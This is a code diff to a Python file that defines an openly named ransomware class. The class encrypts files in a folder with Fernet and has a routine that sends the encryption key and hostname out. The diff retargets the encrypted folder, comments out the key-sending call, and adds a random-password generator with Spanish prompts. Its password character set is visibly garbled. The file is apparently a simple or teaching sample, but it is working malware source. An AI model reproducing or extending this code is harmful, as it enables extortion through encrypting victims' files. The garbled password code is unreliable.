@@ -7,7 +7,8 @@ import sys
 from cryptography.fernet import Fernet
 import socket
 import datetime
-
+import string
+import random
 
 class Ransomware:
     """ This class represents file encrypting ransomware.
@@ -155,6 +156,27 @@ class Ransomware:
         flag = True
 
         return flag
+    def generate_random_password(self,characters):
+        ## length of password from the user
+        length = int(input("Indique largo de la contraseña: "))
+
+        ## shuffling the characters
+        random.shuffle(characters)
+        
+        ## picking random characters from the list
+        password = []
+        for i in range(length):
+            password.append(random.choice(characters))
+
+        ## shuffling the resultant password
+        random.shuffle(password)
+
+        ## converting the list to string
+        ## printing the password
+        print("Nueva contraseña:\n")
+        print("".join(password))
+        print("\n\n")
+
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.DEBUG)
@@ -163,7 +185,15 @@ if __name__ == '__main__':
     ransomware = Ransomware('SimpleRansomware')
 
     #Find all specified files
-    files = ransomware.get_files_in_folder('Test')
+    files = ransomware.get_files_in_folder('Cifrado')
+
+    #------------------Funcion util-----------------------
+    # characters to generate password from
+    characters = list(string.ascii_letters + string.digits + "[email protected]#$%^&*()")
+
+    # invoking the function
+    ransomware.generate_random_password(characters)
+    #------------------END funcion util-------------------
 
     #Generate key
     key = ransomware.gen_key
@@ -176,8 +206,8 @@ if __name__ == '__main__':
     number_encrypted_files = ransomware.encrypt_files_in_folder(key, path)
     print('Number of encrypted files: {}'.format(number_encrypted_files))
 
-    hostname = socket.gethostname()
-    send_key(hostname, key)
+    #hostname = socket.gethostname()
+    #send_key(hostname, key)
 
     # Decrypt files located in the given directory
     number_decrypted_files = ransomware.decrypt_files_in_folder(path)
